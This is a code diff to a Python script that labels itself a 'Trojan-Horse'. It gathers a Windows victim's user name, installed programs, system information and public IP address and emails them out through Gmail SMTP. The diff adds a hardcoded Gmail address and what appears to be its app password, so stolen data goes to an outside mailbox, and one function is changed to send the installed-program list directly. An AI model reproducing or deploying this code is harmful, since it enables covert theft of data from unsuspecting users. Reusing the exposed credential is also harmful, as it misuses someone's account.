@@ -1,12 +1,11 @@
-import threading
 from termcolor import colored
-import os, smtplib, subprocess, requests
+import os, smtplib, subprocess, requests, threading, time
 
 ##############################Trojan-Horse#################################
 
 #get the registered username
-data = subprocess.check_output('wmic os get RegisteredUser').decode()
-registered_user = data.split('\n')[1].split()[0]
+data = subprocess.check_output(['powershell', '-Command', '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'], shell=True).decode().strip()
+registered_user = data.split('\\')[-1]
 
 path1 = f'c:/Users/{registered_user}/yoursystemdatalol.txt'
 path2 = f'c:/Users/{registered_user}/yourprogramsinstalleddatalol.txt'
@@ -18,10 +17,12 @@ def send_sys_infs():
 
 def send_programs_installed():
     #save the programs installed in a text file
-    data = subprocess.check_output('powershell get-startapps'.split()).decode()
-    file = open(path2, mode='w')
-    file.write(data)
-    file.close()
+    data = subprocess.check_output(['powershell', '-Command', 'Get-StartApps | Out-String'], shell=True)
+    obj = smtplib.SMTP('smtp.gmail.com', 587)
+    obj.starttls()
+    obj.login('surajsundar407@gmail.com', 'xyvh wmsh lzfo tndz') #userid and password for from address
+    obj.sendmail('surajsundar407@gmail.com', 'surajsundar407@gmail.com', data) #from address, to address
+    obj.quit()
 
 def public_ip_data():
     #save the public ip address in a text file
@@ -46,12 +47,12 @@ x2.join()
 x3.join()
 
 def sendmail():
-    file1, file2, file3 = open(path1, mode='r'), open(path2, mode='r'), open(path3, mode='r')
-    data1, data2, data3 = file1.read(), file2.read(), file3.read()
+    file1, file3 = open(path1, mode='r'), open(path3, mode='r')
+    data1, data3 = file1.read(), file3.read()
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('', '') #userid and password for from address
-    obj.sendmail('', '', data1+'\n\n\n'+data2+'\n\n\n'+data3) #from address, to address
+    obj.login('surajsundar407@gmail.com', 'xyvh wmsh lzfo tndz') #userid and password for from address
+    obj.sendmail('surajsundar407@gmail.com', 'surajsundar407@gmail.com', data1+'\n\n\n'+data3) #from address, to address
     obj.quit()
 
 sendmail()
